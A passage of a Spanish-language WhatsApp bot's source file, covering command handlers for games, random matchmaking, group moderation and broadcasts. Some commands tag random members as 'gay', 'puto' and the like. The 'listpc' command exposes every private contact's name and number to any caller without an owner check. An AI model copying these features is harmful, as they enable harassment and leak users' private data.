                    simple.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    simple.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    simple.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    simple.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
    case 'modena': {
        const side = Math.floor(Math.random() * 2) + 1
        if (side == 1) {
            sock.sendMessage(from, {
                image: {
                    url: 'https://i.ibb.co/LJjkVK5/heads.png'
                },
                caption: "cara"
            }, {
                quoted: m
            })
        } else {
            sock.sendMessage(from, {
                image: {
                    url: 'https://i.ibb.co/wNnZ4QD/tails.png'
                },
                caption: "cruz"
            }, {
                quoted: m
            })
        }
    }
    break
            case 'pareja': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫tu pareja es

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '👀', buttonText: { displayText: '👀' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, jawab, simple.user.name, floc, {mentions: ments})
            }
            break
            case 'amigos': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `creo que pueden ser muy buenos amigos ekisde🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '👀', buttonText: { displayText: '👀' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, jawab, simple.user.name, fdoc, {mentions: menst})
            }
            break
            case 'califica':
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
				if (!q) return reply(`Usar ${command} text\n\nEjemplo : ${command} mi foto`)
					const ra = ['0', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
simple.sendMessage(from, { text: `Calificando: ${q}\nLe pongo un: *${te}%*` }, { quoted: m })

					break
            case 'gay': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `he detectado que...
 @${jodoh.split('@')[0]} es gay🏳️‍🌈`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '👀', buttonText: { displayText: '👀' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, jawab, simple.user.name, m, {mentions: ments})
            }
            break
      case 'tonto':
      case 'cerdo':
      case 'idiota':
      case 'gil':
      case 'lesbian':
      case 'puto':
      case 'noob':
      case 'estupendo':
      case 'hachero':
      case 'elegante':
      case 'hermoso':
      case 'pequeño':
      case 'sexy':
      case 'hot': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `El más *${command}* es @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '👀', buttonText: { displayText: '👀' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, jawab, footer, m, {mentions: ments})
            }
            break
case 'dados': case 'dado':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
const dir = [
    'https://tinyurl.com/ygms8wvy',
    'https://tinyurl.com/yhdyhnap',
    'https://tinyurl.com/yfwjbou7',
    'https://tinyurl.com/yh3e3ogt',
    'https://tinyurl.com/yfmhpvxs',
    'https://tinyurl.com/ygpxka9q'
  ];
  simple.sendMedia(m.chat, dir[Math.floor(Math.random() * dir.length)], 'dadu.webp', '', m)
  }
  break
case 'morir':
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit              
              if (!q) return reply(`¡No válido!\n\n¿que nombre quieres saber en que fecha morirá??`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`NOMBRE : ${predea.data.name}\n*muerto a la edad :* ${predea.data.age} Años.\n\n_Date prisa, arrepiéntete, hermano, porque nadie sabe de la muerte.`)
              break
case 'textoinvert': case 'invertirtxt': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
if (args.length < 1) return reply(`Ejemplo:\n${prefix}fliptext Mysimple`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 TEXTO INVERTIDO 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Invertido :*\n${flipe}`)
}
break
case 'hackear':
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!m.mentionedJid[0]) return reply(`*️A quien deseas Hackear?*\n\nEjemplo : ${prefix}hackear @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
 hacked = fs.readFileSync(`./media/hacker.mp4`) 
 let captionb = `@${m.sender.split`@`[0]} Pidió que hackee a @${m.mentionedJid[0].split`@`[0]}`
await simple.sendMessage(m.chat, { video: hacked, caption: `${captionb}`, gifPlayback: true }, { mentions: parseMention(captionb), quoted: m })
	break            
case 'simi':{
let anu = await fetchJson(`https://api.simsimi.net/v2/?text=${text}&lc=es&cf=false`)
let res = anu.success;
m.reply(res)
}
break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 REACT+GROUP FUNCIONES - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                simple.sendMessage(m.chat, reactionMessage)
            }
            break  
      case 'join': {
     if (!isCreator) return reply(mess.owner)
     if (!args[0]) return replay(`Where's the link?`)
     vdd = args[0]
     let vcc = vdd.split("https://chat.whatsapp.com/")[1]
     if (!vcc) return replay("Link invalid!")
     if (isCreator) {
     await simple.groupAcceptInvite(vcc).then(async(res) => reply(jsonformat(res))).catch(_ => _)
     reply("Listo!")
     } else {
     simple.query({
     tag: "iq",
     attrs: {
     type: "get",
     xmlns: "w:g2",
     to: "@g.us"
     },
     content: [{ tag: "invite", attrs: { code: vcc } }]
     }).then(async(res) => {
     sizny = res.content[0].attrs.size
     if (sizny < 20) {
     teks = `Sorry, munimun 20 members are required in a group to add bot!`
     sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./media/fake.jpeg'), `${global.packname}`, `${global.botname}`, "593991398786@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
     } else if (sizny > 20) {
     await simple.groupAcceptInvite(vcc).then(async(res) => reply(jsonformat(res))).catch(_ => _)
     reply("Entré!")
     } else {
     reply("Error")
     }
     }).catch(_ => _)
     }
     }
     break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await simple.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
        if (!text) throw 'a quien deseas remover?\n Ejemplo @tag'
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await simple.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
        if (!text) throw 'a quien deseas añadir?\n Ejemplo @tag'
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await simple.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
        if (!text) throw 'a quien deseas promover?\n Ejemplo @tag'
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await simple.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
        if (!text) throw 'a quien deseas degradar?\n Ejemplo @tag'
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await simple.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Que nombre ?'
                await simple.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdescrip': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'que descripción le ponemos ?'
                await simple.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!/image/.test(mime)) throw `Enviar/Responder imagen con el comando ${prefix + command}`
                if (/webp/.test(mime)) throw `Enviar/Responder imagen con el comando ${prefix + command}`
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                await simple.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': case 'infoall':
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                let tekss = `══✪〘 *👥 Mención All* 〙✪══\n\n➲ *Mensaje : ${q ? q : 'Ninguno'}*\n\n`
		      	for (let mem of participants) {
		            tekss += `🏅 @${mem.id.split('@')[0]}\n`
				}
                tekss += `\n⋙ *${botname}* ⋘`
                simple.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: fkontak })
            break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            simple.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
               case 'totag': {
               if (!m.isGroup) throw mess.group
               if (!isBotAdmins) throw mess.botAdmin
               if (!isAdmins) throw mess.admin
               if (!m.quoted) throw `Responde a un mensaje con el comando ${prefix + command}`
               simple.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
               case 'encuesta': {
            if (!isAdmins) throw mess.admin
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Todavía hay votos en este chat.!_\n\n*${prefix}deletevoto* - para borrar votos`
            if (!text) throw `Ingrese el motivo del voto, ejemplo: *${prefix + command} @Carlos debería ser admin?*`
            reply(`Comienza la votación!\n\n*${prefix}votopositivo* - por Si\n*${prefix}votonegativo* - por no\n*${prefix}checkvoto* - para comprobar el voto\n*${prefix}deletevoto* - para borrar votos`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 ENCUESTA 」*

*RAZÓN:* ${vote[m.chat][0]}

┌〔 VOTOS POSITIVOS (SI) 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 VOTOS NEGATIVOS (NO) 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}deletevoto* - para borrar votos`
let buttonsVote = [
  {buttonId: `${prefix}votopositivo`, buttonText: {displayText: 'VOTAR SI'}, type: 1},
  {buttonId: `${prefix}votonegativo`, buttonText: {displayText: 'VOTAR NO'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: simple.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            simple.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'votopositivo': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no se vota en este grupo!*_\n\n*${prefix}encuesta* - para empezar a votar`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'has votado'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 ENCUESTA 」*

*Razon:* ${vote[m.chat][0]}

┌〔 VOTOS POSITIVOS (SI) 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 VOTOS NEGATIVOS (NO) 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevoto* - para borrar votos`
            let buttonsUpvote = [
              {buttonId: `${prefix}votopositivo`, buttonText: {displayText: 'votar si'}, type: 1},
              {buttonId: `${prefix}votonegativo`, buttonText: {displayText: 'votar no'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: simple.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            simple.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'votonegativo': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no se vota en este grupo!*_\n\n*${prefix}encuesta* - para empezar a votar`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'has votado'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 ENCUESTA 」*

*Razon:* ${vote[m.chat][0]}

┌〔 VOTOS POSITIVOS (SI) 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 VOTOS NEGATIVOS (NO) 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevoto* - para borrar votos`
            let buttonsDevote = [
              {buttonId: `${prefix}votopositivo`, buttonText: {displayText: 'votar si'}, type: 1},
              {buttonId: `${prefix}votonegativo`, buttonText: {displayText: 'votar no'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: simple.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            simple.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'checkvoto':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no se vota en este grupo!*_\n\n*${prefix}encuesta* - para empezar a votar`
teks_vote = `*「 ENCUESTA 」*

*Razón:* ${vote[m.chat][0]}

┌〔 VOTOS POSITIVOS (SI) 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 VOTOS NEGATIVOS (NO) 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevoto* - para borrar votos


©${simple.user.id}
`
simple.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevoto': case'delvote': case 'hapusvote': {
            if (!isAdmins) throw mess.admin	
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no se vota en este grupo!*_\n\n*${prefix}encuesta* - para empezar a votar`
            delete vote[m.chat]
            reply('Eliminar con éxito la sesión de votación en este grupo')
	    }
            break
            case prefix+'creargp':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Ejemplo* : #creargp nombregp`)
let cret = await simple.groupCreate(args.join(" "), [])
let response = await simple.groupInviteCode(cret.id)
teks = `  「 *CREADOR DE GRUPO* 」

_▸ nombre : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} _

https://chat.whatsapp.com/${response}
`
m.reply(teks)
break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await simple.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Grupo cerrado`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await simple.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Grupo abierto`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Abrir' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'cerrar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `Modo del grupo`, simple.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await simple.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Edición de descripción abierta al publico`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await simple.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Cerrada solo para admins`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Abrir' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Cerrar' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `Modo de Editar Descripción`, simple.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Activo antes`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Activado!`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`No estuvo activo antes`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Desactivafo !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `Modo Antilink`, simple.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`ya activo antes`)
                db.data.chats[m.chat].mute = true
                m.reply(`${simple.user.name} listo, desmuteado !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`no está activo `)
                db.data.chats[m.chat].mute = false
                m.reply(`${simple.user.name} listo, muteado !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await simple.sendButtonText(m.chat, buttons, `Mutear Bot`, simple.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgrupo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await simple.groupInviteCode(m.chat)
                simple.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink del grupo : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === '1') {
                    await simple.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await simple.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await simple.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await simple.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CAMBIAR EPHEMERAL",
                rows: [
                {title: "Ephemeral 1 dia", rowId: `ephemeral 1`, description: `Activa el grupo efímero por 1 día`},
                {title: "Ephemeral 7 días", rowId: `ephemeral 7`, description: `Activa el grupo efímero por 7 días`},
                {title: "Ephemeral 90 días", rowId: `ephemeral 90`, description: `Activa el grupo efímero por 90 días`},
                {title: "Ephemeral Off", rowId: `ephemeral off`, description: `Desactivar este grupo efímero`}
                ]
                },
                ]
                simple.sendListMsg(m.chat, `Seleccione la siguiente lista de opciones efímeras !`, simple.user.name, `Hola Admin ${groupMetadata.subject}`, `Click Aquí`, sections, m)
                }
            }
            break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    simple.sendText(m.chat, 'Lista Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Cambios del - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

case 'autoadmin':{
     if (!m.isGroup) return reply(mess.group)
     if (!isCreator) return reply('Este comando es solo para el creador')
     m.reply('Ahora sos admin papai') //opcional 
    await simple.groupParticipantsUpdate(m.chat, [m.sender], "promote")
}
break
case 'deleteadmin':{
    if (!m.isGroup) return reply(mess.group)
    if (!isCreator) return reply('Este comando es solo para el creador')
    m.reply('Ya no eres administrador') // opcional
    await simple.groupParticipantsUpdate(m.chat, [m.sender], "demote")
}
break
        case 'block': {
		if (!isCreator) throw mess.owner
        if (!text) throw 'a quien deseas bloquear?\n Ejemplo 593XXXXX'	
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await simple.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
        if (!text) throw 'a quien deseas desbloquear?\n Ejemplo 593XXXXX'	
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await simple.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!/image/.test(mime)) throw `Enviar/Responder imagen con el comando ${prefix + command}`
                if (/webp/.test(mime)) throw `Enviar/Responder imagen con el comando ${prefix + command}`
                let media = await simple.downloadAndSaveMediaMessage(qmsg)
                await simple.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break

	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // 
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break


            case 'setnombre': case 'setnamebot': {
            if (!text) throw `Ejemplo : ${prefix + command} WhatsApp`
            let name = await simple.updateProfileName(text)
            m.reply(`Se cambió el nombre del bot con éxito a ${name}`)
            }
            break
            case 'setstatus': case 'setbiobot': case 'setbotbio': {
            if (!text) throw `este es un bot de WhatsApp llamado Simple-MD`
            let name = await simple.updateProfileStatus(text)
            m.reply(`Cambió con éxito el estado de la biografía del bot a ${name}`)
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw '¡El mensaje no fue enviado por mí bot!'
                simple.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Responde un mensaje mío')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Yo no envié ese mensaje!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Tiempo :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Estado :* ${read ? 'Leido' : 'Visto'}\n\n`
                }
                simple.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'quoted': {
		if (!m.quoted) return m.reply('Responde un mensaje!!')
		let wokwol = await simple.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('este mensaje no contiene una respuesta')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *Lista de chats personales*\n\nChats totales : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nombre :* ${nama}\n⬡ *Usuarios :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 simple.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LISA DE GRUPOS *\n\nTotal de grupos : ${anu.length} Grupos\n\n`
                 for (let i of anu) {
                     let metadata = await simple.groupMetadata(i)
                     teks += `⬡ *Nombre :* ${metadata.subject}\n⬡ *Creador :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Creación :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Participantes :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 simple.sendTextWithMentions(m.chat, teks, m)
             }
             break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 BROADCAST - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
    case 'bcgps': {
        if (!isCreator) {
            reply("Solo owner!!!!")
            return;
        }
        if (!text) {
            reply("❌ No se proporcionó ningun texto!")
            return;
        }
        let getGroups = await simple.groupFetchAllParticipating()
        let groups = Object.entries(getGroups)
            .slice(0)
            .map(entry => entry[1])
        let res = groups.map(v => v.id)
        reply(` transmitiendo en ${res.length} Chat de grupo, en ${res.length * 1.5} segundos`)
        for (let i of res) {
            let txt = `🔰</ *${botname} Broadcast* >🔰\n\n🏮 Mensaje:~> ${text}`
            await simple.sendMessage(i, {
                image: {
                    url: "https://i.pinimg.com/736x/3a/15/a3/3a15a349b478f236f026cb52ab7bc984.jpg"
                },
                caption: `${txt}`
            })
        }
        reply(`Emitido con éxito en ${res.length} grupos`)
    }
    break
case 'bctext': {
if (!isCreator) return
if (!text) throw `*Escriba un texto*\n\nEjem : ${prefix + command} Test`
let anu = await store.chats.all().map(v => v.id)
reply(`*Enviar difusión a* ${anu.length} Chat\n*Time ${anu.length * 1.5} Segundos*`)
